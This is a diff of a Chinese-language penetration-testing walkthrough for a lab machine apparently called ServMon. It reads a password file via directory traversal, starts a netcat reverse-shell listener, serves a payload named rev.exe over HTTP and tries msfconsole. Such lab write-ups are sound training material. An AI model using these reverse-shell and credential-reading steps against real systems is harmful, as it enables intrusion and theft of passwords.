@@ -352,8 +352,7 @@ The vulnerability allows local attackers to escalate privileges and execute arbi
 #### 得到密码
 #### 我首先尝试使用目录遍历漏洞读取NSClient++配置文件，但它不起作用。
 
-#### 我从FTP笔记中知道，在C:\users\nathan\desktop\password.txt有一个密码文件。我将使用目录遍历漏洞来尝试读取该文件，它可以工作：
-![图片](images/2026020902.png)
+#### 我从FTP笔记中知道，在C:\users\nathan\desktop\password.txt有一个密码文件。
 ```
 [★]$ burpsuite
 
@@ -675,7 +674,7 @@ servmon\nadine
 
 nadine@SERVMON C:\ProgramData>exit
 ```
-#### 这不是我们要的
+#### 点击RUN，就反弹连接上了
 ![图片](images/2026022602.png)
 ```
 [★]$ sudo nc -lvnp 443
@@ -735,3 +734,4 @@ Saved as: rev.exe
 Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
 ```
 #### 也使用过msfconsole 不行
+#### 中间过出春节，这个靶机历经17天
